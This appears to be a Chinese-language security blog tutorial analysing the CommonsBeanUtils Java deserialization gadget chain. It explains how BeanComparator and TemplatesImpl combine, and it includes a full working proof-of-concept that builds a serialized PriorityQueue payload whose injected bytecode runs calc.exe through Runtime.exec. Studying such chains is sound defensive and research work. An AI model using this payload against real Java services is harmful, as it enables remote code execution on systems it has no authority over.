<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>CommonsBeanUtils 反序列化 - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "CommonsBeanUtils \u53cd\u5e8f\u5217\u5316", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "\u4e86\u89e3Apache Commons BeanUtils \u7684\u529f\u80fd", url: "#apache-commons-beanutils" },
              {title: "BeanUtils \u4e0e TemplatesImpl", url: "#beanutils-templatesimpl" },
              {title: "Poc", url: "#poc" },
              {title: "\u603b\u7ed3", url: "#_2" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
        JNDI注入原理浅析
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-link">
        一些trick
      </a>
    </div>
    
  </div>

    

    <h1 id="commonsbeanutils">CommonsBeanUtils 反序列化</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#了解Apache-Commons-BeanUtils-的功能">了解Apache Commons BeanUtils 的功能</a></li>
<li><a href="#BeanUtils-与-TemplatesImpl">BeanUtils 与 TemplatesImpl</a></li>
<li><a href="#Poc">Poc</a></li>
<li><a href="#总结">总结</a></li>
</ul>
<p>在CC2这条链中，主要是通过向java.util.PriorityQueue对象传入恶意java.util.Comparator对象，导致在PriorityQueue在反序列化过程中执行了恶意java.util.Comparator的compare方法。</p>
<p>而java.util.Comparator实际是一个接口，我们在CC2中传入的是它的一个继承类：TransformingComparator。那么除了TransformingComparator 以外还有没有其它能够造成反序列化攻击的java.util.Comparator实现对象呢？</p>
<h2 id="apache-commons-beanutils">了解Apache Commons BeanUtils 的功能</h2>
<p>Apache Commons工具集下除了collections以外还有BeanUtils ，它主要用于操控javabean。</p>
<p>举个与反序列化攻击有关的操控javabean的例子。</p>
<p>这里直接套用p牛的例子。</p>
<pre><code class="language-c#">final public class Cat {
    private String name = &quot;catalina&quot;;

    public String getName() {
        System.out.println(&quot;123&quot;);
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
</code></pre>
<p>然后我们执行</p>
<pre><code class="language-c#">PropertyUtils.getProperty(new Cat(), &quot;name&quot;);
</code></pre>
<p>这个方法会调用目标类的相关属性的getter方法，也就是Cat类中的getName方法，所以输出结果如下</p>
<p><img alt="" src="../image/image_jQwxg316rg.png" /></p>
<h2 id="beanutils-templatesimpl">BeanUtils 与 TemplatesImpl</h2>
<p>我们通过上面的叙述，知道了BeanUtils 如何调用目标类某属性的getter方法。</p>
<p>而在TemplatesImpl中有如下的链：TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() -&gt; 恶意类初始化</p>
<p>同时在TemplatesImpl中存在如下方法TemplatesImpl#getOutputProperties()</p>
<p><img alt="" src="../image/image_OEP7C9ZY0h.png" /></p>
<p>我们可以发现它调用了newTransformer并且是一个getter方法，所以我们可以想办法用BeanUtils的PropertyUtils#getProperty调用该方法从而开启TemplatesImpl链，从而执行恶意字节码。</p>
<p>BeanUtils存在如下包 org.apache.commons.beanutils.BeanComparator，它继承自java.util.Comparator接口，所以实现了compare方法：</p>
<p><img alt="" src="../image/image_xcpCFLJOTR.png" /></p>
<p>如果传入两个对象时 this.property不为空，就会分别对两个对象调用PropertyUtils.getProperty从而触发其对应getter方法。</p>
<p>由此来看，我们可以创建一个BeanComparator类，通过反射等手段将其property属性改成OutputProperties，再使其加载进java.util.PriorityQueue，在java.util.PriorityQueue反序列化时自动调用BeanComparator#compare，这个时候想办法将传入该方法的对象改成恶意TemplatesImpl，使PropertyUtils.getProperty触发getOutputProperties这个getter方法，即可达到恶意字节码执行的效果。</p>
<p>光说肯定会觉得抽象，下面直接上代码，其中大部分内容与CC2重合，重合部分的描述因此略过。</p>
<h2 id="poc">Poc</h2>
<pre><code class="language-c#">import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

public class Main {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;Cat&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
        cc.setName(randomClassName);
        //cc.writeFile();
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};


        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, &quot;_bytecodes&quot;, targetByteCodes);
        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
        setFieldValue(obj, &quot;_class&quot;, null);

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);

        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); //将comparator的property修改，使其在compare方法中去执行getOutputProperties
        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
        setFieldValue(queue, &quot;size&quot;, 2);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
</code></pre>
<p>调用链</p>
<pre><code class="language-c#">ObjectInputStream.readObject()
        PriorityQueue#readObject()
        PriorityQueue#heapify()
        PriorityQueue#siftDown()
        PriorityQueue#siftDownUsingComparator()
                BeanComparator#compare()
                      PropertyUtils#getProperty()
                              TemplatesImpl.newTransformer()
                              TemplatesImpl.getTransletInstance()
                                  EvilClass.newInstance()

</code></pre>
<h2 id="_2">总结</h2>
<p>将java.util.PriorityQueue中的Comparator设置为BeanComparator，从而在BeanComparator#compare中调用getProperty方法，从而调用TemplatesImpl#getOutputProperties，进而触发TemplatesImpl _bytecodes字节码恶意实例化。</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
        JNDI注入原理浅析
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-link">
        一些trick
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>